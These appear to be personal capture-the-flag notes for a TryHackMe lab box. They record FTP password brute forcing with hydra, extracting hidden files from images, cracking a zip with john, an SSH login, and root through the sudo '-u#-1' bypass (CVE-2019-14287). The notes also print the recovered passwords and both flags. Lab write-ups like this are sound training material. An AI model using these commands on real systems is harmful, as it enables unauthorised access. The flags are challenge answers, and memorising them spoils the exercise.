<pre>
Machine IP: 10.10.231.220


Enum:
    Open Ports:
        21/tcp open  ftp     vsftpd 3.0.3
        22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
        80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))


Secret page:
10.10.231.220/agent_C_attention.php    

Lets brute force for ftp chris pwd:
hydra -l chris -P ~/Documents/wordlists/rockyou.txt 10.10.231.220 -t 4 ftp
login: chris   password: crystal

User:chris
Pwd:crystal


Login to ftp 

Ftp open 10.10.231.220

Name (10.10.231.220:root): chris
Password:crystal 


Password some where in photo: cute-alient.jpg:
strings cute-alien.jpg
CDEFGHIJSTUVWXYZcdefghijstuvwxyz

Extract zip from cutie.jpg
binwalk -e cutie.png

Cd _cutie.jph

zip2john 8702.zip | cut -d ':' -f 2 > hashes.txt


john --format=zip hashes.txt
alien            (?)


User flag:
Ssh login
ssh james@10.10.231.220 -p 22
Pwd:hackerrules!
Userflag:b03d975e8c92a7c04146cfa7a5a313c7





Root flag:
sudo -l 
(ALL, !root) /bin/bash
sudo -u#-1 id

And got root

Cat /root/root.txt

To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R



exploits
https://www.exploit-db.com/exploits/47502
https://sysdig.com/blog/detecting-cve-2019-14287/
</pre>
